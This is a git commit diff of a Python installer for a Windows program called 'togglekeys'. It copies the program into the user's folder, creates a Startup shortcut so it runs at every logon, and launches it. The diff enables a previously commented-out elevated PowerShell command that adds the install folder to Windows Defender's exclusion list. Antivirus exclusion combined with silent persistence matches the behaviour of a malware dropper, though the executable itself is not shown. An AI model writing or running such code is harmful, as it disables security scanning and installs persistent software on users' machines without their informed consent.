7300fba07f41a70cdb7201e0956dfbb78abff53c
karthik <130954788+karthikvvk@users.noreply.github.com>
2024-05-07 08:05:57 +0530

    Update installer.py

--- installer.py
+++ installer.py
@@ -4,19 +4,24 @@ import win32com.client
 username = os.getlogin()
 pa = f"C:\\Users\\{username}"
 os.system(f"xcopy \"togglekeys\" \"{pa}\" /s /e")
-os.chdir(os.path.join(pa, "togglekeys"))
+root = os.path.join(pa, "togglekeys")
+os.chdir(root)
 
 def get_command(path):
     return f'powershell -Command "Start-Process powershell -Verb RunAs -ArgumentList \'-Command \"Add-MpPreference -ExclusionPath \\"{path}\\"\"\'"'
 
-#os.system(get_command(os.getcwd()))
-#os.system(get_command(rf"C:\Users\{os.getlogin()}\AppData\Roaming\Microsoft\Windows\Start`Menu\Programs\Startup"))
+os.system(get_command(os.getcwd()))
 
 #AI_generated_code
-exe_path = os.path.join(os.getcwd(), r"togglekeys.exe")
+exe_path = os.path.join(root, "togglekeys.exe")
 startup_path = os.path.join(rf"C:\Users\{username}\AppData\Roaming", r'Microsoft\Windows\Start Menu\Programs\Startup')
+os.chdir(startup_path)
 shortcut_name = "togglekeys.lnk"
 shell = win32com.client.Dispatch("WScript.Shell")
 shortcut = shell.CreateShortCut(os.path.join(startup_path, shortcut_name))
 shortcut.Targetpath = exe_path
+shortcut.WorkingDirectory = root
 shortcut.save()
+#AI_generated_code_ends_here
+
+os.system("start togglekeys.lnk")
